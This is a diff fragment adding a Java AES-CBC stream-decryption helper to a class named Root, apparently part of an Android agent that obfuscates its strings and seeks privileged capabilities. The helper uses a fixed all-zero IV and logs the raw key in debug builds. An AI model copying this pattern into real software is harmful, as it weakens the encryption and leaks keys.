@@ -1172,6 +1172,36 @@ public class Root {
 		return cis;
 	}
 
+	static public InputStream decodeEncSimple(InputStream stream) throws IOException,
+			NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {
+
+		SecretKey key = MessagesDecrypt.produceKeySimple();
+
+		if (Cfg.DEBUG) {
+			Check.asserts(key != null, "null key"); //$NON-NLS-1$
+		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (decodeEnc): stream=" + stream.available());
+			Check.log(TAG + " (decodeEnc): key=" + ByteArray.byteArrayToHex(key.getEncoded()));
+		}
+
+		// 17.4=AES/CBC/PKCS5Padding
+		Cipher cipher = Cipher.getInstance(M.e("AES/CBC/PKCS5Padding")); //$NON-NLS-1$
+		final byte[] iv = new byte[16];
+		Arrays.fill(iv, (byte) 0);
+		IvParameterSpec ivSpec = new IvParameterSpec(iv);
+
+		cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
+		CipherInputStream cis = new CipherInputStream(stream, cipher);
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (decodeEnc): cis=" + cis.available());
+		}
+
+		return cis;
+	}
+
 	/*
 	 * Verifica e prova ad ottenere le necessarie capabilities
 	 * 
